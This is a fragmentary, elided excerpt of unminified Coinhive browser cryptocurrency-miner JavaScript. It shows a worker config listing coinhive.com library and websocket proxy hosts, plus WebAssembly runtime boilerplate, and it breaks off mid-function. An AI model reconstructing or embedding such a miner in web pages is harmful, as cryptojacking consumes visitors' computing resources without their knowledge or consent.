//this is total unminified version of coinhive.min.js
(function(window) {
    "use strict";
...
CoinHive.CRYPTONIGHT_WORKER_BLOB = URL.createObjectURL(new Blob(["self.CoinHive = self.CoinHive || {};\
self.CoinHive.CONFIG = {\
    LIB_URL: \"https://coinhive.com/lib/\",\
    WEBSOCKET_SHARDS: [\
        [\"wss://ws001.coinhive.com/proxy\", \"wss://ws002.coinhive.com/proxy\", \"wss://ws003.coinhive.com/proxy\", \"wss://ws004.coinhive.com/proxy\", \"wss://ws005.coinhive.com/proxy\", \"wss://ws006.coinhive.com/proxy\", \"wss://ws007.coinhive.com/proxy\", \"wss://ws029.coinhive.com/proxy\"],\
...
\
                ...
                DYNAMICTOP_PTR = allocate(1, \"i32\", ALLOC_STATIC); STACK_BASE = STACKTOP = Runtime.alignMemory(STATICTOP); STACK_MAX = STACK_BASE + TOTAL_STACK; DYNAMIC_BASE = Runtime.alignMemory(STACK_MAX); HEAP32[DYNAMICTOP_PTR >> 2] = DYNAMIC_BASE; staticSealed = true; Module[\"wasmTableSize\"] = 14; Module[\"wasmMaxTableSize\"] = 14;\
\
...
\
                ...
                var calledMain = false; dependenciesFulfilled = function runCaller() {\
